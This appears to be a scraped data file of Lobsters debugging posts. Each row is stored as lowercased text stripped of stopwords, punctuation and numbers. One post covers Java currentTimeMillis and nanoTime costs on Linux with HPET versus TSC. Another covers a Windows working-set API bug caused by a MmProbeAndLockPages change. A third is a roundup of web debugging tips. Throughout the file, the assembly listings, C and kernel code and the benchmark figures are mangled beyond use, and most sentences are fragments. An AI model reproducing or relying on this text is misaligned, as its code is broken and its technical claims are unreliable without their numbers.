systemcurrenttimemillis systemoutprintln sum sum time n n iter running window notebook window core using java get java time sum time n iter sum time n iter sum time n iter good result time reported n put time request instruction anywhere measure time operation attach timestamp resource virtually free query time million time per second let run linux one use testing rhel flavour kernel version run dual cpu java time sum time n iter sum time n iter sum time n iter reduce iteration count couple zero make one million test run two hundred time longer average time query time linux n half microsecond execute call million time per second really shocking mean u must careful use currenttimemillis linux still applicable measuring time sequential long operation method really used task listed done window version currenttimemillis native function code found openjdk distribution linked jvmcurrenttimemillis file hotspotsrcsharevmprimsjvmcpp eventually end o javatimemillis call osdependent window version code hotspotsrcoswindowsvmjvmcpposwindowscpp look like jlong o javatimemillis usefaketimers return faketime else filetime wt getsystemtimeasfiletime wt return windowstojavatime wt jlong windowstojavatime filetime wt jlong jlongfrom wtdwhighdatetime wtdwlowdatetime return offset static jlong offset jlong offset return offset java time based getsystemtimeasfiletime return filetime structure date back system consists two field dwhighdatetime dwlowdatetime combined together define number interval since epoch time msvc call function trace execution debugger disassembly mode show code mov edi edi push ebp mov ebp esp push ebx push esi push edi mov mov mov mov eax dword ptr esi mov edx dword ptr edi mov ecx dword ptr ebx cmp eax ecx jne mov ecx dword ptr pop edi pop esi pop ebx mov dword ptr ecx edx mov dword ptr eax pop ebp ret pause jmp indeed clever function contains system call everything happens user space memory area mapped address space every process background thread regularly update three doublewords contain high part value low part high part client read three order two high part equal low part considered consistent strong memory access ordering guarantee procedure must repeated unlikely event entire procedure fast function look even better mode mov mov rax qword ptr rax mov dword ptr rcx eax shr mov dword ptr eax ret background thread write value atomically client atomically read actually code could even better could write value one instruction mov mov rax qword ptr rax mov qword ptr rcx rax ret however code much faster possible system call anyway resolution timer let collect value array print later define n int value n int main void int n filetime f getsystemtimeasfiletime f value int fdwlowdatetime n value value printf dn value value return output timer tick roughly every half millisecond hz perfectly adequate serve base currenttimemillis linux version happened much longer journey expected start another version o javatimemillis hotspotsrcoslinuxvmoslinuxcpp jlong o javatimemillis timeval time int status gettimeofday time null assert status linux error return jlong timetvsec jlong timetvusec unlikely time spent multiplication division let measure performance gettimeofday anyway volatile tt int main void int int n struct timeval time n gettimeofday time tt timetvsec timetvusec tt printf time f f nsn n tt tt n return running get time n call gettimeofday indeed slow perhaps system call involved let run gdb stepped call gettimeofday see dump assembler code function gettimeofday plt jmpq rip gettimeofday gotplt pushq jmpq first jmpq fact jump next instruction eventually end function called dlruntimeresolve actually happening linking vdso virtual dynamic shared object small fully relocatable shared library premapped user address space linking happens first call gettimeofday call resolved first indirect jump go straight function let skip execution break next call gettimeofday function look jmpq rip gettimeofday gotplt time jump take u real implementation added comment dump assembler code function gettimeofday push rbp mov rsp rbp push push push push push rbx sub rsp test rdi rdi je tv null gtodreadbegin mov rip gtod seq mov eax mov lsl ax ebx xor mov ebx test gtod seq jne gtod seq cpurelax repeat mov rip rax gtod walltimesec mov rip gtod vclockmode mov rax rdi t tvsec mov rip edx gtod vclockmode mov rip gtod walltimesnsec cmp edx vclocktsc je cmp edx vclockhpet je xor eax eax cmp edx vclockpvclock mov rip je mov rip ecx gtod shift mov rip edx gtod seq cmp edx start jne jne retry lea shr cl mov rdi rcx n nsecpersec n cmp jbe xor edx edx sub add edx cmp ja add rcx rdx test mov rdi t tvnsec n mov rdx rdi t tvsec sec je vdsofallbackgtod mode vclocknone never true mov rax tv tvusec movabs rdx sar imul rdx sar rdx sub rdx mov rdi test rsi rsi jne xor eax eax add rsp pop rbx pop pop pop pop pop rbp retq vreadpvclock mov rbp cmp mov ebx ecx je mov ecx eax eax mov eax edx mov ecx eax mov edx rbp shr rdx eax add edx cmp edx jg shl edx mov cltq movslq edx rdx shl rax sub rdx add rax mov eax mov eax rbp xchg ax ax lfence rdtsc shl rdx mov eax eax movsbl ecx rax rdx sub rdx mov eax mov rdx shl cl test ecx ecx j mov eax edx mov rax mul rdx shrd rdx rax mov rax mov rax mov rax rbp movzbl eax mov al rbp xchg ax ax lfence mov rip eax mov ecx cmp eax mov eax rbp je ecx cmp ecx rbp jne mov eax test al jne cmp eax rbp jne testb rbp mov rbp rax mov rip rdx cmove add rax cmp rdx rax cmovb rdx rax sub rdx rax rip rax gtod mask mov rip edx gtod mult imul rdx rax v cycle gtod cyclelast gtod mask return v gtod mult jmpq nopl rax mode vclockpvclock mov rip eax hpetcounter sub rip rax gtod cyclelast jmp rdtscp jmp rdtscp jmpq nopl rax xchg ax ax vreadtsc lfence rdtscbarrier rdtsc nativereadtsc shl rdx mov eax eax rax rdx mov rip rax gtod cyclelast cmp rax rdx jb sub rax rdx mov rdx rax jmp xor edx edx jmpq neg ecx shr cl rdx mov rdx jmpq xor eax eax jmp mov edx gtod seq jmpq retry mov rip eax mov eax rsi mov rip eax mov rsi xor eax eax jmpq pause mov rip gtod seq jmpq mov eax fallback syscall jmpq end assembler dump vdso mapped new address time probably security feature however function always placed address run gdb sure cause function access memory address far code always using relativetoip addressing mode make function completely relocatable mapped address user space together data see function employ various option make syscall execute rdtsc instruction read memory similar fashion window implementation option applied case let look source code version linux kernel note latest one linux distributor conservative people code latest one differs quite bit including constant definition code notrace int vdsogettimeofday struct timeval tv struct timezone tz likely tv null unlikely dorealtime struct timespec tv vclocknone return vdsofallbackgtod tv tz tv tvusec unlikely tz null tz tzminuteswest gtod tzminuteswest tz tzdsttime gtod tzdsttime return rest code gtod obviously stand gettimeofday struct vsyscallgtoddata unsigned seq int vclockmode cyclet cyclelast cyclet mask mult shift open coded struct timespec walltimesnsec gtodlongt walltimesec gtodlongt monotonictimesec monotonictimesnsec gtodlongt walltimecoarsesec gtodlongt walltimecoarsensec gtodlongt monotonictimecoarsesec gtodlongt monotonictimecoarsensec int tzminuteswest int tzdsttime static inline unsigned gtodreadbegin const struct vsyscallgtoddata unsigned ret repeat ret accessonce seq unlikely ret cpurelax goto repeat smprmb return ret static inline int gtodreadretry const struct vsyscallgtoddata unsigned start smprmb return unlikely seq start define vvar name vvar name back define gtod vvar vsyscallgtoddata notrace static int alwaysinline dorealtime struct timespec t unsigned long seq n int mode seq gtodreadbegin gtod mode gtod vclockmode t tvsec gtod walltimesec n gtod walltimesnsec n vgetsns mode n gtod shift unlikely gtodreadretry gtod seq t tvsec n nsecpersec n t tvnsec n return mode going close happened window data structure accompanies vdso mapped address space every process called vvarvsyscallgtoddata addressed code via pseudovariable gtod assembly listing structure sits address background thread update field structure regular interval since two field window trick writing high part number twice work however similar trick work writer maintains version number data structure seq field get incremented one writer start updating structure one finish appropriate write barrier instruction used result odd value mean data consistent reader must read number make sure even wait bit using pause instruction read value interest structure read version number beginning data considered correct gtodreadbegin gtodreadretry function read barrier instruction must used make sure processor reorder reading version number reading actual data however strong memory ordering intel make unnecessary read barrier call smprnb empty case value interest walltimesec walltimesnsec first one proper number second since epoch reported good old time call fact time implemented reading exactly value without locking version control notrace timet vdsotime timet atomic nt need lock timet result accessonce gtod walltimesec result return result second value nanosecond time relative last second shifted left gtod shift rather time measured unit becomes nanosecond time shifted right gtod shift case high precision one nanosecond divided attosecond perhaps linux kernel designer looked far ahead anticipating future need accuracy time measurement real resolution time value let read value loop print change unless want run program gdb must first resolve vdso relocation easy const struct vsyscallgtoddata gtod void resolve void unsigned char p struct timeval time gettimeofday time p char gettimeofday p p exit p p unsigned char p p unsigned intptrt p p p gtod const struct vsyscallgtoddata p run loop detect change walltimesnsec void test void int oldns n gtod walltimesnsec n oldns printf sec lu n lu diff ld nsshift lu diffshift ldn gtod walltimesec n n oldns n gtod shift n gtod shift oldns gtod shift oldns n typical fragment output see walltimensec value updated rather infrequently iteration stay jump big value shifted shift becomes n almost exactly one millisecond also interesting see happens walltimesec change new nanosecond value start zero start half millisecond always big saw value short two variable available gtod structure provide fast access rather coarse time value one millisecond resolution like window however gettimeofday stop try improve accuracy using method code vgetsns function responsible notrace static inline vgetsns int mode v cyclest cycle gtod vclockmode vclocktsc cycle vreadtsc ifdef confighpettimer else gtod vclockmode vclockhpet cycle vreadhpet endif ifdef configparavirtclock else gtod vclockmode vclockpvclock cycle vreadpvclock mode endif else return v cycle gtod cyclelast gtod mask return v gtod mult idea somewhere system highfrequency timer ask current tick count record reading timer last tick coarse timer gtod cyclelast get difference gtod mask gtod mult field help convert reading timer unit explain choice unit linux designer wanted measure time molecular process unit chosen small reduce error conversion code provides three type highfrequency timer tsc based rdtsc instruction intel instruction set hpet based external hardware hpet chip pvclock probably something running vm environment case code make use highprecision timer get offset coarse time timer run stable year supposed stable enough provide time offset coarse timer tick moreover clock frequency may vary long variance known system reflected appropriate update mask mult field system well designed provide accurate time fast went wrong case vclockmode field set mean using hpet high precision event timer timer hardware piece included modern pc replacement good old chip chip ran counter upon reaching zero could trigger interrupt could also read directly using instruction ran frequency mhz programmed expire every clock caused interrupt every m hz remember since m do day hpet run higher frequency count rather available via memorymapped io rather io port routine read counter look like static notrace cyclet vreadhpet void return const volatile hpetpage hpetcounter compiled one memory read instruction mov rip eax entire gettimeofday case hpet time source compiled sequence memory read plus shift multiplication division expensive operation present executing slowly sampling profiler available test machine poor man solution attach gdb running program executes gettimeofday loop interrupt case tried always stopped exactly one place abovementioned instruction indicates instruction alone take execution time easy verify let resolve hpetpage similar way resolving vsyscallgtoddata read variable loop time take half microsecond read data hpet timer make slow time source print value read timer see unlike case gtod walltimesnsec value change time access timer typical difference mean timer tick time read timer accuracy way higher performance difference timer value measured point coarse nanosecond change learned happens every millisecond mean hpet frequency mhz n per tick really sad timer run high frequency way read frequency read mhz bit higher frequency m do timer worst part use case fact uninterested high accuracy anyway need currenttimemillis coarse timer perfectly suitable coarse timer easy way coarse timer available via user api clockgettime function int clockgettime clockidt clkid struct timespec tp among multiple value defined timeh clkid one exactly need clockrealtimecoarse value code function present vdso vclockgettimec notrace static void dorealtimecoarse struct timespec t unsigned long seq seq gtodreadbegin gtod t tvsec gtod walltimecoarsesec t tvnsec gtod walltimecoarsensec unlikely gtodreadretry gtod seq nanosecond time reported function n m apart execution take n tsc time source learned slow execution currenttimemillis caused two factor jvm using gettimeofday instead clockgettime gettimeofday slow hpet time source used hpet however time source day perhaps even common many system use tsc could make entire study irrelevant however project server configured hpet time source reason time source integrated well ntp client allowing smooth time adjustment tsc stable know detail local linux guru say option trust developer may find situation besides java developer always know time source configured machine program run feel finding made far still important however still interesting find result would change used tsc time source tsc stand time stamp counter simply number cpu cycle counted since startup time wide wrap around year clock rate value read using rdtsc instruction traditionally two problem value value different core physical processor may shifted processor may start different time clock frequency processor may change execution first one seems indeed problem tried getting rdtsc value several core synchronised writing memory location even best case got difference couple thousand cycle sometimes however problem programmer want use tsc manually case thread affinity must set accordingly o know reschedules thread one core another make necessary adjustment second problem seems thing past intel doc say processor family increment timestamp counter differently pentium processor family model pentium processor intel xeon processor family model family processor timestamp counter increment every internal processor clock cycle internal processor clock cycle determined current coreclock busclock ratio technology transition may also impact processor clock pentium processor intel xeon processor family model higher intel core solo intel core duo processor family model intel xeon processor series intel core duo processor family model intel core intel xeon processor family displaymodel intel atom processor family displaymodel timestamp counter increment constant rate also say processor support invariant tsc indicated edx test attribute noinline cpuid void asm mov eaxn cpuidn mov edx eaxn void test void printf xn cpuid print indicates bit set additional testing confirms void attribute noinline rdtsc p asm lfencen rdtscn mov eax rdi n mov edx rdi n micros void struct timeval time gettimeofday time return timetvsec timetvusec void delay void int double printf fn void test void micros rdtsc sleep delay micros rdtsc printf time clocksnano fn let enable turbo boost run known processor taskset time cloclsnano running check clock speed processor zero cat proccpuinfo grep mhz head n cpu mhz comment sleep uncomment delay repeat taskset time cloclsnano clock speed cat proccpuinfo grep mhz head n cpu mhz rate rdtsc equal nominal clock rate processor case differed real clock rate corresponding core mean tsc quite safe use processor one way using function clockgettime mentioned clock id corresponds tsc clockprocesscputimeid speed however great get n per call better option keep using gettimeofday set tsc preferable time source entire system easy echo tsc return back hpet use hpet instead tsc temporary survive reboot let go straight back java program put two zero back repetition count result amazing java time sum time n iter sum time n iter sum time n iter good window n still much better probably practically usable use case listed beginning time gettimeofday get time since gettimeofday return time microsecond natural limit resolution n indeed achieved call function many time print difference consecutive value get many zero occasional one test clockgettime clockrealtime return n exactly execution time call expected short tsc time source fast accurate two reservation system may reason use clockgettime clockrealtimecoarse faster multithreaded performance currenttimemillis based hpet run n operationssecond per core entire system let run similar test timejava start n thread n total number core dualprocessor system including hyperthreading one result small number thread thread countavg timecall nstotal callssec mil average time take execute currenttimemillis thread count look quite linear make u suspect hpet chip serialises request serving one time possibly little bit one judging transition thread count thread count performance halve rather dropped time graph total performance system number call performed core processor one second performance went opsec stayed initial increase may something fact testing dualprocessor system time measured execution limited one processor taskset thread countavg timecall n two processorsavg timecall n one processor singleprocessor time show abnormal step one two thread roughly proportional number thread except value one thread longer dualprocessor time testing multiple process give similar result multiple thread short performance hpet indeed limited systemwide two million time enquiry per second performed machine matter split load core process core loaded evenly perform operation per second mean one must really careful using currenttimemillis java program gettimeofday c chance program executed using hpet also applies use c timereporting functionality std chrono systemclock us clockgettime clockrealtime end reading hpet register although invokes syscall process side note since processor affect using hpet potential security problem one process may run tight loop calling gettimeofday thus starving process access resource reducing performance alternatively process may call function time execution using tsc detect way process query current time may help establish execution path process take end side note tscbased timer demonstrate behaviour performance quite stable dropping core including hyperthreading one used offtopic system call seen vdso code end system call intel version linux system call exactly gettimeofday function fast system call call directly modifying original time measurement gettimeofday replace gettimeofday time syscall time get time sourcetime vdso nstime syscall nscost syscall n hpet tsc previously believed system call linux incredibly expensive measurement prof belief false system call exactly free cheaper example cache miss n however performed action short tsc gettimeofday still beneficial avoid system call vdso really help case made execution almost three time faster first prize make sure program ever run window linux tsc time source impossible way speed call staying pure java solution make sure currenttimemillis called often obviously one implement custom version call using jni based clockgettime even direct reading tsc latter case thread affinity control may required measured cost jni call n total cost n acceptable conclusion title completely correct currenttimemillis always slow however case call lightning fast window n reasonably fast linux tsc time source n indeed slow linux hpet time source n hpet shared running thread process entire system query two million time per second even slow timer sufficient application however case higher performance required api call return coarse time work fast clockgettime java vm could used call provide fast currenttimemillis absolutely necessary one implement herhimself using jni linux system call dramatically slow believed still take substantial time n update nanotime discussion reddit received multiple comment pointing systemcurrenttimemillis fact bad choise call first three use case listed beginning systemnanotime correct one reason nanotime monotonic currenttimemillis latter may affected time adjustment ntp daemon leap second matter userinitiated time change even though factor apply project machine synchronised gps time booted later adjusted submillisecond interval result time never jump back program run stall bit fully agree comment would gladly used monotonic coarse timer one java bit awkward java provides two function differ two parameter nature time resolution parameter orthogonal grant need four function monotonic coarse monotonic fine nanotime realtime coarse currenttimemillis realtime fine two provided however need remaining two last one instance may useful timestamp event highfrequency trading needed actually first one fact reason needed coarse timer first place potential fast actually reason coarse timer exist coarse timer much faster fine one needed two type timer sufficient unfortunately seems case coarse timer faster due currenttimemillis implemented using gettimeofday evaluation time nanotime compared currenttimemillis java methodwindows nslinux hpet nslinux tsc n currenttimemillis nanotime nanosecond timer bit slower millisecond one window still fast enough linux version run speed milli timer linux version implemented jlong o javatimenanos linux supportsmonotonicclock struct timespec tp int status linux clockgettime clockmonotonic tp assert status gettime error jlong result jlong tptvsec jlong tptvnsec return result else timeval time int status gettimeofday time null assert status linux error jlong usecs jlong timetvsec jlong timetvusec return usecs call clockgettime function clockmonotonic parameter end vdso function domonotonic notrace static int alwaysinline domonotonic struct timespec t unsigned long seq n int mode seq gtodreadbegin gtod mode gtod vclockmode t tvsec gtod monotonictimesec n gtod monotonictimesnsec n vgetsns mode n gtod shift unlikely gtodreadretry gtod seq t tvsec n nsecpersec n t tvnsec n return mode timer type controlled vclockmode parameter dorealtime used gettimeofday execution end vgetsns either read hpet register performs rdtsc difference coarse value read gtod monotonictime instead gtod walltime wonder run speed fact realtime monotonic clock share mode unfortunate said earlier reason u use hpet cooperated ntp daemon better since monotonic time affected ntp could based tsc tsc used consecutive call nanotime return value n apart consecutive call clockgettime return interval n look like accuracy nanotime limited duration n remaining n must test overhead window version look like jlong o javatimenanos hasperformancecount return javatimemillis nanosecspermillisec best else largeinteger currentcount queryperformancecounter currentcount double current aslong currentcount double freq performancefrequency jlong time jlong currentfreq nanosecspersec return time performancefrequency come call queryperformancefrequency pc return timer frequency hz rather low window measure time fast n rather big increment one tick equal n test java confirms continuous call nanotime return result differ zero occasional curiosity let look code queryperformancecounter time mode push rbx sub mov al byte ptr mov rbx rcx cmp jne mov rcx qword ptr rdtsc shl rax rdx mov qword ptr rbx rax lea rdx raxrcx mov cl byte ptr shr rdx cl mov qword ptr rbx rdx mov add pop rbx ret include code jne go al loaded equal case probably flag tell use rdtsc value read added number probably base value shifted right number number case explains magical value performance frequency clock frequency tsc computer ghz divided resolution could higher smaller shift factor chosen conclusion update coarse timer java much faster fine timer mean fine timer could used everywhere fine realtime one provided linux nanotime performance tsc mode mostly satisfactory hpet mode window nanotime four time slower currenttimemillis still fast enough resolution however far ideal unknown reason comment welcome reddit
415,Lobsters,debugging,Debugging,Breaking backwards compatibility: a 5 year old bug deep within Windows,http://www.triplefault.io/2017/07/breaking-backwards-compatibility-5-year.html,breaking backwards compatibility year old bug deep within window,entire compatibility layer old software running modern iteration alex ionescu blog post kernel forgotten apis page fault quick recap article demo window build window build creator update went wrong enabling process working set logging msdn documentation api set mapping msdn documentation logging page fault querying working set logging rant reading memory search vad entry bug optimization nt mmprobeandlockpages documentation pte page table entry walk o development nt easy,microsoft great track record maintaining support legacy software running window entire compatibility layer baked o dedicated fixing issue decade old software running modern iteration window learn application compatibility infrastructure recommend swinging alex ionescu blog great set post describing technical detail user even kernel mode shimming implemented said understatement say microsoft take backwards compatibility seriously occasionally human microsoft make mistake usually though quick address problem blog post go unnoticed bug introduced window documented api time post bug still present window creator update around year forgotten apis set apis introduced window xp monitor working set process process working set collection page chunk memory currently ram physical memory accessible process without inducing page fault particular apis interest u initializeprocessforwswatch getwschangesgetwschangeex reading msdn documentation easy discover intended use apis apis profile number page fault occur within process address space page fault quick recap general category page fault hard page fault occurs memory accessed currently ram physical situation like o need retrieve memory disk eg pagefilesys make accessible faulting process soft page fault occurs memory ram physical currently accessible process induced fault memory might shared amongst multiple process process caused page fault might mapped working set type page fault much performant hard page fault disk io conducted last final type page fault known formally invalid fault also referred access violation caused program example try access unallocated memory try write memory marked readonly paging necessary make modern operating system work probably many process running system nearly enough ram hold possible content process physical memory learn paging strongly recommend article posted colleague demo best way illustrate broken example created two simple program first application workingsetwatchexe implement initializeprocessforwswatch getwschangeex apis application log specific memory region paged process working set second application readprocessmemoryexe implement reading arbitrary memory blob another target process memory space basic idea use readprocessmemoryexe read monitored memory address inside workingsetwatchexe induce page fault window build workingsetwatchexe application work expected able read valid sized buffer using readprocessmemoryexe log window build creator update unfortunately workingsetwatchexe seem log page fault occurs remote application readprocessmemoryexe read buffer greater equal byte however seem work expected read occurs le byte render working set apis useless profiling reason window went wrong determine went wrong need reverse engineer part window see exactly implementation changed window window disassembly pseudosource reconstructed system file provided window creator update enabling process working set logging enable working set logging process need call initializeprocessforwswatch msdn documentation told newer version window api exported within analysis begin function simple invokes import another library case executes function name contained within different library library nt exist disk rather resolve api set mapping corresponding kernelbasedll exist disk version window look kernelbasedll implementation show call ntsetinformationprocess performed without parameter marshalling next target ntsetinformationprocess within ntdlldll simplistic syscall stub eventually make way implementation contained within ntoskrnlexe window kernel nt ntsetinformationprocess massive function contains huge switch statement support different processinfoclass passed interested processinfoclass processworkingsetwatch case snippet relevant part cleanedup disassembly interesting note able start monitoring process working set either class processworkingsetwatch processworkingsetwatchex achieved invoking nt ntsetinformationprocess directly instead going documented route initializeprocessforwswatch latter utilizes processworkingsetwatch class actual logic nt ntsetinformationprocess pretty trivial understand blob memory allocated per process monitoring blob memory pagefaulthistory structure contains processwswatchinformation structure internally processwswatchinformation structure entry describes page fault entry cycled array fill recall msdn documentation remark section must call getwschangesex enough frequency avoid record loss make perfect sense see fixed number record allocated took liberty documenting structure union beginning pagefaulthistory structure may little confusing explained later successful execution routine monitored process object internal member eprocessworkingsetwatch updated include recently allocated pagefaulthistory pointer additionally pswatchenabled global set value informs system track page fault process remain set system reboots even process running working set tracked reference pswatchenabled already inspected one nt ntsetinformationprocess investigation lead u nt kipagefault logging page fault page fault occurs cpu transfer execution nt kipagefault pswatchenabled global set mean enabled working set logging process system execution passed nt pswatchworkingset function documented mentioned type page fault access violation logged process working set due early nt mmaccessfault nt kipagefault since function executed type page fault hard soft system accessed heavily operating system luckily one first thing routine check whether working set watch enabled process page fault occurred working set watch process routine completes per documentation nt pswatchworkingset function record processed entryselectorbusy describe part depth later time since higher priority interrupt preempt working set monitor logic routine need adequate sanity safety check complete atomically interlocked operation possible first part function safely select free index pagefaulthistorywatchinfo array use logging purpose array full entry miss recorded pagefaulthistorymissingrecords routine completes everything successful page fault event recorded free slot pagefaulthistorywatchinfo array interesting undocumented feature change entry processwswatchinformationfaultingva least significant bit hard page fault occurred soft page fault occurred ultimately nt seem apparent bug code additionally code match closely window version know work investigation lead u working set watch retrieval function getwschangesex querying working set logging article brevity give quick summary callflow getwschanges getwschangesex function call kernelbasedll variant branch kernelbase getwschangesinternal invoke ntdll ntqueryinformationprocess appropriate processinfoclass particular processworkingsetwatch class used getwschanges family function processworkingsetwatchex used others ntdll ntqueryinformationprocess syscall made make implementation ntqueryinformationprocess within kernel massive switch statement awaits part interest u resides one level deeper within nt pspqueryworkingsetwatch input validation eg alignment check safety check nt exisrestrictedcaller avoid kernel pointer leak low integrity process process object retrieved supplied process handle operating system check see eprocessworkingsetwatch member set like documentation state one query access process working set buffer time entryselectorbusy additionally buffer accessed logging nt pswatchworkingset nt kipagefault produce miss long enough space user supplied buffer operating system copy entry array user supplied buffer data structured appropriate way appropriate processinfoclass last entry user supplied buffer psapiwswatchinformationex terminated faultingpc member null additionally number miss recorded faultingva member last entry finally pagefaulthistorywatchinfo array eprocessworkingsetwatch reset successful call rant initializeprocessforwswatch getwschangesex apis surprisingly finicky many weird restriction caveat make surprisingly difficult developer retrieve information regarding complete set page fault occurred within process good chance run situation record wind missing especially multiprocessor multithreaded environment example thread querying working set process page fault occurs another thread within process miss could recorded since pagefaulthistorybusy member acquired nt pspqueryworkingsetwatch prevent page fault logging logic nt pswatchworkingset functionally weakens usability api profiling purpose compound problem entry stored array call getwschangesex mb pagesize page fault history really nt enough modern application complex specific situation ran test vm processor allocated furthermore application simple enough thread mitigates chance page fault miss additionally thorough investigation working set apis concluded still discovered bug particular buffer size play role success apis demo unable log page fault window buffer size greater equal byte possible bug within workingsetwatchexe rather readprocessmemoryexe continue investigation need turn readprocessmemoryexe reading memory readprocessmemoryexe application simple enough understand know logging page fault reading buffer greater equal byte since apparent bug working set apis problem likely resides readprocessmemory step past irrelevant detail strategy applied previous part particular readprocessmemory call kernelbase readprocessmemory function nothing special moreorless directly issue system call invoking ntdll ntreadvirtualmemory take u implementation nt readvirtualmemory kernel function invokes nt mireadwritevirtualmemory version ntoskrnl routine may inlined caller body aside check prevents reading writing protected process processobject pcbsecurepid function nearly identical one window kernel need go deeper traverse nt mmcopyvirtualmemory function massive contains many subfunctions inlined article brevity important part nt mmcopyvirtualmemory highlighted one first thing routine search vad entry corresponds input address fromaddress toaddress idea leverage region size information memory nt really relevant bug leave discussion vad virtual address descriptor another time nt mmcopyvirtualmemory next task determine input buffer length particular couple check buffer length value significant u know bug seems manifest buffer size greater equal byte basically seems buffer greater equal byte nt mmcopyvirtualmemory utilize nt mmprobeandlockpages nt mmmaplockedpagesspecifycache followed memcpy clone memory buffer le byte nt mmcopyvirtualmemory leverage memcpy directly using buffer stack buffer allocated dynamic memory based buffer size via nt exallocatepoolwithtag probably done performance reason larger memory copy probably benefit direct mapping instead memory pool copying leverage memory pool copying buffer le byte size trigger page fault event logged workingsetwatchexe application hand leverage direct mapping copy memory trigger page fault one incorrect assumption believe window optimization exist contrary similar logic inside older version nt mmcopyvirtualmemory however something change otherwise would discrepancy workingsetwatch program investigation lead u nt mmprobeandlockpages bug optimization nt mmprobeandlockpages implementation nt mmprobeandlockpages underwent drastic change window looked two function sidebyside quickly notice window implementation way much simpler purpose nt mmprobeandlockpages per documentation ensure specified virtual page argument contained within memorydescriptorlist backed physical memory additionally series permission check ensure virtual page permit userspecified access right window perform access check routine actually probed memory directly accessing would induce page fault context correct process therefore able log using workingsetwatchexe application window process optimized instead accessing memory directly pte page table entry walk performed ensure correct permission exist change make process efficient especially since ptes leveraged lock memory physical page anyway o development nt easy one seemingly inconspicuous change break functionality entirely unrelated part operating system case optimization underlying logic nt mmprobeandlockpages functioned broke backwards compatibility working set apis bug seems entirely unnoticed unfortunately render performance profiling nature getwschangesex apis useless potential fix microsoft simply throw page fault invalid page pswatchenabled global set granularly process eprocessworkingsetwatch set
416,Lobsters,debugging,Debugging,Debugging Tips and Tricks,https://css-tricks.com/debugging-tips-tricks/,debugging tip trick,main concept isolate problem methodical remember kid parent said get lost stay choose good tool syntax highlighting linting airbnb browser extension accessibility extension react devtools vue devtools codopen pageruler devtools weekly newsletter gifs article site cs tracker enhancement misc tool input ghostlabapp eruda awesome tool specific tip accessibility marcy sutton debugging cs checking state react animation debugging cs keyframe animation val head great screencast checking different connection speed load set timed debugger right simulator remote debugger cs grid debugging video array debugging debugging resource frontend master course app discover devtools modern devtools debugging advanced performance audit devtools,writing code one small piece developer order efficient capable job must also excel debugging dedicate time learning new debugging skill often find move much quicker add value team work tip trick rely pretty heavily found give advice workshop compilation well community start core tenet drill specific example main concept isolate problem isolation possibly strongest core tenet debugging codebases sprawling different library framework include many contributor even people working project anymore isolating problem help u slowly whittle away nonessential part problem singularly focus solution benefit isolation include limited figuring actually root cause think sort conflict timebased task understanding whether race condition taking hard look whether code simplified help writing maintaining untangling seeing one issue perhaps important make issue reproducible without able discern exactly issue way reproduce difficult solve also allows compare working model similar see changed different two lot different method isolation practice one create reduced test case local instance private codepen jsbin another create breakpoints code see execute bit bit way define breakpoints literally write debugger inline code see fire small piece time take one step chrome devtools even walk next event fired choose specific event listener good ol consolelog form isolation echo php print python taking one tiny piece execution testing assumption checking see something altering probably timetested form debugging matter advanced become still us arrow function allowed u step console debugging game well lot easier write useful oneliners console consoletable function also favorite tool mine especially great lot data need represent large array large object like consoledir function also nice alternative log interactive listing object property consoledir give interactive listing methodical teach workshop help student class number one thing find hold back try debug problem methodical enough truly tortoiseandthehare kind situation understandably want move quickly change ton thing something stop working know thing changed causing error debug change many thing get little lost trying figure working extent become proficient tool write code without testing assumption new syntax technology slow careful behooves much better shot backing issue might inadvertently created indeed created issue debugging one thing time might seem slower expose exactly change happened error lie way seemingly faster pace allow say seemingly time actually recovered working way remember kid parent said get lost stay parent least moving around find also moving around find fewer chance bumping one another code work way le moving piece better returning consistent result easier track thing debugging try also install anything put new dependency see different error every time returning static result big red flag headed right sleuth hat choose good tool million different tool solving variety problem going work tool find useful link bevy resource syntax highlighting sure damn fun pick new hotness color flavor syntax highlighting theme spending time thinking clarity matter often pick dark theme skip syntax turn code lighter color find error really easy see right away tend like oceanic next panda really one important keep mind looking good syntax highlighter awesomelooking great functional calling mistake important totally possible linting linting help flag suspicious code call error might overlooked linting incredibly important linter choose much languageframework writing top agreedupon code style different company different code style rule personally like airbnb take care use old linter linter enforces pattern want enforce stall build process cs linter complained whenever wrote browser hack ended circumvent often stopped useful good linter shine light small error might missed lurking resource browser extension extension really awesome enabled disabled readily work really specific requirement working particular library framework chance extension devtools enabled going give sort clarity find otherwise take care though extension bog browser permission execute script little homework extension author rating background said favorite accessibility extension dequeue system react devtools really vital opinion working react see virtual dom vue devtools endorsement codopen pop editor mode debug window codepen full disclosure husband made present sick watching manually opening debug window best gift ever pageruler get pixel dimension measure anything page like one super duper anal layout help feed beast devtools probably obvious debugging tool many thing many packedin feature easy miss next section specific tip go deep dive favorite umar hansa great material learning devtools weekly newsletter gifs new course linked last section article site one favorite recent one cs tracker enhancement shown permission umar show unused cs understand performance impact cs tracker show colorcoded rule used unused set misc tool input global utility tracking current input method mouse keyboard touch well current intent really good tracking accessiblity leak hat tip marcy sutton accessibility expert tipoff ghostlabapp pretty snazzy tool responsive development checking anything deployed across ton device offer synchronized web development testing inspection eruda awesome tool help debug mobile device really like take simulator step give console real devtools help gain understanding specific tip always interested people debug asked community csstricks account really list mixture tip like well roundup tip community accessibility body focusin function consolelog documentactiveelement log currently focused element useful opening devtools blur activeelement sutton debugging cs got quite lot response saying people put red border element see even little cs file drop class access different color easily checking state react prop michael one useful debugging tool know snippet pretty print state component working onto component see going validate state working way think help track error state using animation got lot response said slow animation way mentioned post wrote right cs trick debugging cs keyframe animation tip like hardware accelerate work multiple transforms different percentage also slow animation javascript greensock would look like timelinetimescale slow whole timeline one thing time super useful mojs would look like speed val head great screencast going chrome firefox devtools offering animation want use chrome devtools timeline performance audit worth mentioning painting expense task thing equal pay little attention high percentage green checking different connection speed load tend work fast connection throttle connection check see performance would look like people internet speed also useful conjunction hard reload cache empty set timed debugger one came chris whole writeup right settimeout function debugger similar debugger tool mentioned earlier except put settimeout function get even finetuned information simulator mentioned simulator eruda io user also get pretty sweet simulator going tell install xcode first tweet showed another way chrome also device toggle helpful remote debugger actually know tool seeing tweet pretty useful cs grid debugging rachel andrew gave presentation smashing mentioned little waffle thing click firefox illuminate gutter grid video explains really eloquently rachel andrew show highlight gutter firefox devtools array debugging wes bos really useful tip searching single item array debugging resource jon kuperman frontend master course help master devtools go along app small course code school called discover devtools umar hansa new online course called modern devtools julia evans great article debugging hat tip jamison dance showing paul irish advanced performance audit devtools super nerdy like want dig timeline finally put bittersweet resource friend james golick excellent programmer even excellent human gave great conference talk debugging anything many year ago sadly james passed still honor memory learn video
